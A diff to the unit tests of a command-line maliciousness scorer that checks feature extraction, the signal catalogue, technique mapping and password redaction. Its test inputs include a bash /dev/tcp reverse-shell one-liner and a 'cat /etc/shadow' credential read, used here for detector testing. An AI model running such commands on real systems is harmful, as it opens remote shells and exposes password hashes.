@@ -1,24 +1,17 @@
-"""Tests for the maliciousness scorer and the tradecraft feature module."""
+"""Tests for the maliciousness scorer and the tradecraft features."""
 
 from __future__ import annotations
 
 import unittest
 
 import _bootstrap  # noqa: F401
-from cmdfeat.events import Event
-from cmdfeat.pipeline import ExtractorConfig, FeatureExtractor
-from cmdfeat.scoring import Analyzer
-from cmdfeat.scoring.engine import verdict_for
-from cmdfeat.scoring.signals import SIGNALS, SIGNALS_BY_ID
+from malscore import SCRIPT_SIGNALS, SIGNALS, Analyzer, verdict_for
+from malscore.features import extract_features
 
 
 class TradecraftFeatureTest(unittest.TestCase):
-    @classmethod
-    def setUpClass(cls) -> None:
-        cls.fx = FeatureExtractor(ExtractorConfig(include_behavioral=False))
-
     def features(self, command: str) -> dict:
-        return self.fx.extract_event(Event(0, 1, command=command, user="u"))
+        return extract_features(command)
 
     def test_dev_tcp_reverse_shell(self) -> None:
         self.assertTrue(self.features("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")["dev_tcp_redirect"])
@@ -118,15 +111,24 @@ class ScoringTest(unittest.TestCase):
         self.assertLessEqual(assessment.score, 100)
         self.assertGreaterEqual(assessment.score, 0)
 
-    def test_every_signal_maps_to_features(self) -> None:
-        self.assertEqual(len(SIGNALS_BY_ID), len(SIGNALS))
-        for signal in SIGNALS:
+    def test_signal_catalogue_is_well_formed(self) -> None:
+        catalogue = SIGNALS + list(SCRIPT_SIGNALS.values())
+        self.assertEqual(len({s.id for s in catalogue}), len(catalogue))
+        for signal in catalogue:
             self.assertTrue(0.0 < signal.weight <= 1.0, signal.id)
             self.assertTrue(signal.techniques, "%s has no technique" % signal.id)
 
     def test_techniques_surface_in_output(self) -> None:
         assessment = self.analyzer.assess("cat /etc/shadow")
         self.assertIn("T1003.008", assessment.techniques)
+
+    def test_redaction_only_changes_echoed_text(self) -> None:
+        command = "mysql --password=hunter2 -e 'select 1'"
+        plain = Analyzer().assess(command)
+        redacted = Analyzer(redact=True).assess(command)
+        self.assertEqual(plain.score, redacted.score)
+        self.assertNotIn("hunter2", redacted.command)
+        self.assertIn("hunter2", plain.command)
 
 
 class ScriptScoringTest(unittest.TestCase):
